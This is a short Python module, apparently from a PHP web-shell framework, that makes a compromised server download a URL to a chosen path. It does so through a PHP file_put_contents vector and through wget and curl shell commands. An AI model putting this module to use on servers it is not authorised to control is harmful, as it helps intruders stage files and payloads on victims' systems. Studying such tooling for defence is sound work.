from core.vector import PhpCmd, ShellCmd
from core.module import Module
from core import messages
import random
import datetime


class Webdownload(Module):

    """Download URL to the filesystem"""

    def init(self):

        self._register_info(
            {
                'author': [
                    'Emilio Pinna'
                ],
                'license': 'GPLv3'
            }
        )


        self._register_vectors(
            [
            PhpCmd("""@file_put_contents("${args['rpath']}", file_get_contents("${args['url']}"));""",
              name = "file_put_contents"
            ),
            ShellCmd("""wget ${args['url']} -O ${args['rpath']}""",
              name = "wget"
            ),
            ShellCmd("""curl -o ${args['rpath']} ${args['url']}""",
              name = "curl"
            )
            ]
        )

        self._register_arguments(
            arguments=[
                'url',
                'rpath'
            ],
            options={
                'vector' : 'file_put_contents'
            },
            vector_argument = 'vector')


    def run(self, args):

        return self.vectors.get_result(
         name = args['vector'],
         arguments = { 'args' : args }
        )
